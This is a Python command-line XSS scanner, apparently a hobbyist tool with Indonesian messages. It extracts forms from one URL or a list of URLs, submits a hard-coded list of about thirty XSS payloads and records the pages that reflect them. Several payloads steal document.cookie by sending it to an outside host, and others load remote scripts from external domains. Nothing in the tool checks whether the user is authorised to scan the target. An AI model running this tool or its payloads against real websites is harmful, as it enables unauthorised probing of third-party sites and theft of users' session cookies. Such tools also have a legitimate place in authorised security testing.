import os
import sys
import requests
from pprint import pprint
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin
from colorama import Fore, Style

print(
    Fore.BLUE +
    """
⠀  ⠀⠀⠀⠀⠀⣀⢀⣠⣤⠴⠶⠚⠛⠉⣹⡇⠀⢸⠀⠀⠀⠀⠀⢰⣄⠀⠀⠀⠀⠈⢦⢰⠀⠀⠀⠀⠀⠈⢳⡀⠈⢧⠀⠀⠀⠀⢸⠀⠀⠀⠀
⠀⠀⠉⠀⠀⠀⡏⠀⢰⠃⠀⠀⠀⣿⡇⠀⢸⡀⠀⠀⠀⠀⢸⣸⡆⠀⠀⠀⠰⣌⣧⡆⠀⢷⡀⠀⠀⣄⢳⠀⠀⢣⠀⠀⠀⢸⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⡇⠀⠘⠀⠀⠀⢀⣿⣇⠀⠸⡇⣆⠀⠀⠀⠀⣿⣿⡀⠀⠀⠀⢹⣾⡇⠀⢸⢣⠀⠀⠘⣿⣇⠀⠈⢧⠀⠀⠘⠀⢠⠀⠀
⠀⠀⠀⠀⠀⢀⡇⠀⡀⠀⠀⠀⢸⠈⢻⡄⠀⢷⣿⠀⠀⠀⠀⢹⡏⣇⠀⣀⣀⠀⣿⣧⠀⢸⠾⣇⣠⣄⣸⣿⡄⠀⠘⡆⠀⠀⠀⠀⠆⠀
⠀⠀⠀⠀⠀⣾⢿⠀⠇⠀⠀⠀⢸⠀⠀⢳⡀⢸⣿⡆⠀⠀⠀⣬⣿⡿⠟⠋⠉⠙⠻⣽⣀⡏⠀⠙⠃⢹⡙⡿⣷⠀⠀⢹⠀⠀⠀⠀⠰⠒
⠀⠀⠀⠀⢸⣿⣿⣇⢸⠀⠀⠀⢸⣦⣤⡀⣷⣸⡟⢧⣀⡴⠶⠿⠻⡄⣀⣤⣴⡾⠖⠚⠿⡀⠀⠀⠀⠈⣧⠁⠹⠆⠀⠀⣇⠀⠀⠀⠀⠀
⠀⠀⠀⢀⢸⣀⣼⣿⣼⡆⠀⢀⡘⡇⠀⠀⠹⡟⢷⡜⢉⣠⣠⣠⣀⣤⡿⣛⣥⣶⣾⡿⠛⠿⠿⣶⣦⡤⢹⠀⢀⠀⠀⠀⢹⡄⠀⠀⠀⠀
⠀⠀⠀⢸⢸⡛⠁⠀⠙⢿⠋⠉⠉⠻⠀⠀⠀⢿⣄⠈⠁⠀⠀⠀⢉⢟⣴⡿⠿⠟⢁⠇⠀⠀⠀⠀⠹⣿⠻⡇⢸⠀⠀⠀⠈⣷⠀⠀⠀⠀
⠀⣀⣀⣘⣿⡇⠀⢀⣠⣤⣶⣶⣶⣾⣦⡀⠀⠈⡿⠀⠀⠀⠀⠀⠀⣿⠟⠳⠦⡤⠊⠀⠀⠀⠀⠀⣸⠇⠀⡇⣼⠀⢰⠀⠀⢹⣇⠀⠀⠀
⠛⠁⠈⣿⣷⣧⣴⣿⠿⠛⣿⠿⣿⣿⡿⠗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⣠⣴⣶⠿⠿⠿⡷⢛⠕⠷⡄⣧⣿⠀⢸⠀⠀⠸⣿⡄⠀⠀
⠀⠀⢠⣿⢿⣿⣿⠁⠀⠀⠈⠳⠤⠶⠃⠀⠀⢰⡀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⠟⣱⠒⡠⢆⡴⣣⣯⢞⣴⡟⢿⡄⡏⠀⠀⠀⡏⢷⡀⠀
⠀⠀⡌⣿⠀⠙⣿⡦⢀⣤⡴⣶⠖⣲⠆⢀⠞⠁⠱⠀⠀⠀⠀⠀⠠⣾⠟⠛⡡⠞⠁⢀⡴⢋⢎⣽⡿⣫⠋⠀⠘⢷⠃⡄⠀⠀⡇⠈⣿⡀
⠀⠀⣇⢹⣦⠀⠼⢃⡾⢋⣶⢃⡼⣹⡳⠃⠊⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠈⠠⠋⠀⡰⠋⠀⢘⣇⡇⠀⢠⠟⠀⡇⠀⠀⠀⠀⢹⡵       [ instagram: ep_001n ]                                                                      
⠀⠀⢻⣌⢿⡆⠀⡝⣼⠟⣩⢏⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠞⠀⠀⠀⠀⠈⠀⣠⠏⣠⣾⡇⠀⠀⠀⠀⠘⣷        [ created by Zero ]
⡀⠀⢸⣿⣿⣷⠆⢠⠏⡴⠃⡡⠋⠀⠀⠀⠀⠀⠀⣀⣠⠤⠔⠒⠤⣄⣀⠀⠀⢀⣰⠏⠀⠀⠀⠀⢀⣠⡾⠗⠋⢰⠏⡇⠀⠀⠘⠀⠰⢻
⣇⠀⠘⣿⣿⣟⠻⣄⡞⠀⠐⠁⠀⠀⠀⠀⠀⣠⠞⣩⣤⣶⣶⣾⣷⣶⣬⣿⣿⣿⡏⠀⠀⠀⠀⠉⠉⠁⠀⠀⠀⢸⡆⡇⠀⠀⠀⠀⠀⠀
⠹⡄⠀⠹⣿⣿⡄⠀⠉⠉⠀⡀⠀⠀⠈⢻⣾⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣇⣧⠀⠀⠀⠀⠀⠀
⠀⣿⢦⣀⠘⢿⣷⡀⠀⠀⡀⢦⠀⠀⠀⠀⠹⣿⣿⠏⠙⢻⣿⡿⠛⠉⠀⠸⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⠀⠀⡆⠀⠀⡀
⢼⣿⠀⠈⢳⣤⣉⣻⣤⣀⣉⣩⠆⠀⠀⠀⠀⠹⡿⠀⠀⠈⡿⠀⠀⠀⠀⣸⡇⠀⠀⠀⠀⠀⠀⠓⠂⠀⣠⣾⣿⣿⡿⢿⡄⠀⣧⠀⠀⠹
⣾⠃⠀⣠⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⢸⡇⠀⠀⢠⠴⣿⡄⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⡿⣧⣀⠧⣰⣻⢄⠀⠀
⠛⠶⢾⣿⣽⣭⣽⣭⢹⣷⠀⢹⣦⣀⠀⠀⠀⠀⡄⠀⠀⣸⡀⠀⠀⠁⣰⣧⣽⠀⠀⠀⠀⢀⣴⣾⣿⣿⡟⣻⣿⣿⣿⣿⢠⣿⣧⡸⣷⣄
⠀⠀⠀⠈⠙⠿⣿⣿⣿⠏⠀⣾⣿⣿⣷⣦⣀⠀⢇⠀⠀⠈⠁⠀⣠⠔⠁⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠏⣼⣿⠏⣷⡈⠉
⠀⠀⠀⠀⠀⠀⠀⠙⠻⣶⣾⣿⣿⣿⣿⣿⣿⣷⣾⡆⠀⠀⠀⡾⠁⠀⠀⠀⣀⡴⠞⠛⣛⣿⡿⠿⠛⠛⠉⠉⠀⠀⠀⢰⣿⡿⠂⠈⠻⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢎⠉⠛⠻⠿⠿⠿⠿⠿⣇⠠⠸⣇⣀⣤⣴⣾⡭⠶⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⠇⠀⠀⠀⠘                          
    """ + Fore.RESET)

print()
print()

# Daftar payload XSS yang lebih beragam
XSS_PAYLOADS = [
    "<script>alert('hi')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "<iframe src='javascript:alert(\"XSS\")'></iframe>",
    "<body onload=alert('XSS')>",
    "<a href='javascript:alert(1)'>Click me</a>",
    "<input type='text' value='\";alert(1);//'>",
    "<script>document.write('<img src=x onerror=alert(1)>')</script>",
    "<script>fetch('https://google.com/' + document.cookie)</script>",
    "<marquee onstart=alert('XSS')>XSS</marquee>",
    "<style>body{background:url('x') no-repeat;}</style>",
    "<svg><script>alert('XSS')</script></svg>",
    "<script>console.log('XSS')</script>",
    "<script>document.location='https://google.com/' + document.cookie</script>",
    "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
    "<w contenteditable id=x onfocus=alert()>",
    "<h1>xss<h1>",
    "<p>xss</p>",
    "<x onmouseout=alert(1)>hover this! ",
    "<<scr\0ipt/src=http://xss.com/xss.js></script",
    "<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe",
    "<ScRIPT>console.log('XSS')</ScRIPT>",
    "<marquee/onstart=alert()>",
    "<video/poster/onerror=alert()>",
    "<isindex/autofocus/onfocus=alert()>",
    "<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>",
    "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",
    "<script>for((i)in(self))eval(i)(1)</script>",
    "<sCR<script>iPt>alert(1)</SCr</script>IPt>",
    "%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",

]

class MissingUrlException(Exception):
    pass

class BaseXSSScanner:
    def __init__(self, url):
        if not url:
            raise MissingUrlException('Url is required to run scanner.')
        
        self.url = url

    def _extract_forms(self, url):
        """
        Extract all forms from url.
        """
        soup = bs(requests.get(url).content, "html.parser")
        return soup.find_all("form")

    def get_form_details(self, form):
        """
        Extract details from form like method, url, and inputs.
        """
        details = {}
        action = form.attrs.get("action", "")  # Ambil action atau default ke kosong
        method = form.attrs.get("method", "get").lower()  # Ambil method atau default ke 'get'
        
        inputs = []
        for input_tag in form.find_all("input"):
            input_type = input_tag.attrs.get("type", "text")
            input_name = input_tag.attrs.get("name")
            inputs.append({"type": input_type, "name": input_name})

        details["action"] = action
        details["method"] = method
        details["inputs"] = inputs
        return details

    def _submit_form(self, form_details, url, value):
        """
        Submits a form using form_details.
        """
        target_url = urljoin(url, form_details["action"])
        inputs = form_details["inputs"]
        data = {}
        for input in inputs:
            if input["type"] == "text" or input["type"] == "search":
                input["value"] = value

            input_name = input.get("name")
            input_value = input.get("value")
            if input_name and input_value:
                data[input_name] = input_value

        if form_details["method"] == "post":
            return requests.post(target_url, data=data)
        else:
            return requests.get(target_url, params=data)

    def scan(self, url):
        """
        Given a url, it prints all XSS vulnerable forms and saves results.
        """
        forms = self._extract_forms(url)
        print(f"[+] Detected {len(forms)} forms on {url}.")
        detected_xss = []

        for form in forms:
            form_details = self.get_form_details(form)
            for payload in XSS_PAYLOADS:
                response = self._submit_form(form_details, url, payload)
                print(f"[*] Testing form: {form_details}")
                print(f"[*] Using payload: {payload}")
                if payload in response.content.decode():
                    print(f"{Fore.RED}[+] XSS Detected on {url}{Style.RESET_ALL}")
                    print(f"[*] Form details:")
                    pprint(form_details)
                    detected_xss.append(url)  # Simpan URL yang terdeteksi XSS
        # Buat folder hasil jika belum ada
        # Simpan hasil ke dalam file hasil.txt jika ada XSS yang terdeteksi
        if detected_xss:
            with open(os.path.join('vulnerable.txt'), 'a') as f:
                for detected_url in detected_xss:
                    f.write(detected_url + "\n")
            print(f"{Fore.GREEN}[*] Hasil pemindaian XSS telah disimpan di folder 'hasil/hasil.txt'.{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}[*] Tidak ada XSS yang terdeteksi pada {url}.{Style.RESET_ALL}")

class XSSGameScanner(BaseXSSScanner):
    def get_form_details(self, form):
        details = {}
        action = form.attrs.get("action", "")  # Ambil action atau default ke kosong
        method = form.attrs.get("method", "get").lower()  # Ambil method atau default ke 'get'
        
        inputs = []
        for input_tag in form.find_all("input"):
            input_type = input_tag.attrs.get("type", "text")
            input_name = input_tag.attrs.get("name")
            inputs.append({"type": input_type, "name": input_name})

        details["action"] = action
        details["method"] = method
        details["inputs"] = inputs
        return details

def normalize_url(url):
    """
    Normalize the URL by adding http:// if no scheme is provided.
    """
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    return url

def check_url_status(url):
    """
    Check if the URL is reachable.
    """
    try:
        response = requests.head(url, allow_redirects=True, timeout=10)
        if response.status_code == 200:
            print(f"{Fore.GREEN}[+] {url} is active.{Style.RESET_ALL}")
            return True
        else:
            print(f"{Fore.YELLOW}[-] {url} returned status code: {response.status_code}{Style.RESET_ALL}")
            return False
    except requests.RequestException:
        print(f"{Fore.RED}[!] {url} is not reachable.{Style.RESET_ALL}")
        return False

def main():
    print(f"{Fore.RED}[*] XSS Scanner Menu:{Style.RESET_ALL}")
    print("1. Scan URL")
    print("2. Scan list")
    print("3. Host check")
    print("4. quit/keluar")

    pilihan = input("Pilih menu: ")

    if pilihan == "1":
        url = input("Masukkan URL: ")
        url = normalize_url(url)  # Normalisasi URL
        scanner = XSSGameScanner(url)
        scanner.scan(url)
    elif pilihan == "2":
        file_name = input("Masukkan nama file (misalnya: list.txt): ")
        try:
            with open(file_name, 'r') as file:
                urls = file.readlines()
                for url in urls:
                    url = url.strip()  # Menghapus spasi di awal dan akhir
                    url = normalize_url(url)  # Normalisasi URL
                    print(f"\n{Fore.BLUE}[*] Scanning {url}...{Style.RESET_ALL}")
                    scanner = XSSGameScanner(url)
                    scanner.scan(url)
        except FileNotFoundError:
            print(f"{Fore.RED}[!] File {file_name} tidak ditemukan!{Style.RESET_ALL}")
    elif pilihan == "3":
        active_urls = []
        file_name = input("Masukkan nama file (misalnya: list.txt): ")
        try:
            with open(file_name, 'r') as file:
                urls = file.readlines()
                for url in urls:
                    url = url.strip()  # Menghapus spasi di awal dan akhir
                    url = normalize_url(url)  # Normalisasi URL
                    print(f"\n{Fore.BLUE}[*] Checking status for {url}...{Style.RESET_ALL}")
                    if check_url_status(url):
                        active_urls.append(url)
        except FileNotFoundError:
            print(f"{Fore.RED}[!] File {file_name} tidak ditemukan!{Style.RESET_ALL}")

        # Simpan hasil URL aktif ke file
        if active_urls:
            with open('active-urls.txt', 'w') as f:
                f.write("\n".join(active_urls))
            print(f"{Fore.GREEN}[*] Hasil pengecekan URL aktif telah disimpan di active-urls.txt.{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}[*] Tidak ada URL aktif ditemukan.{Style.RESET_ALL}")

    elif pilihan == "4":
        print("Keluar dari scanner.")
    else:
        print("Pilihan tidak valid. Silakan coba lagi.")

if __name__ == "__main__":    
    main()
